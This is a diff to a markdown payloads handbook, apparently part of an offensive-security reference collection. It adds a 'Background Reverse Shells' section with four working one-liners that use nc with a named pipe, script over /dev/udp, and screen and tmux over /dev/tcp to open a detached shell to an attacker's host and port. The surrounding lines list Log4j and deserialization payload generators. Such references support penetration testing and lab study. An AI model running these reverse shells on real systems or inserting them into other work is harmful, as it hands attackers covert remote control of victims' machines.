@@ -3,6 +3,7 @@
 ## Table of Contents
 
 - [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Resources)
+- [Background Reverse Shells](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Background-Reverse-Shells)
 - [Bash Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Bash-Reverse-Shell)
 - [curl Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#curl-Reverse-Shell)
 - [Exiftool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Exiftool)
@@ -56,6 +57,15 @@
 | woodpecker | Log4j jndi injects the Payload generator | https://github.com/woodpecker-appstore/log4j-payload-generator |
 | ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
 | ysoserial.net | Deserialization payload generator for a variety of .NET formatters | https://github.com/pwntester/ysoserial.net |
+
+## Background Reverse Shells
+
+```c
+$ (mkfifo /tmp/K98LmaT; nc <LHOST> <LPORT> 0</tmp/K98LmaT | /bin/sh >/tmp/K98LmaT 2>&1; rm /tmp/K98LmaT) &
+$ script -c 'bash -i' /dev/null </dev/udp/<LHOST>/<LPORT> >&0 2>&1 &
+$ screen -md bash -c 'bash -i >/dev/tcp/<LHOST>/<LPORT> 2>&1 0<&1' -md ('start a new detached process')
+$ tmux new-session -d -s mysession 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
+```
 
 ## Bash Reverse Shell
 
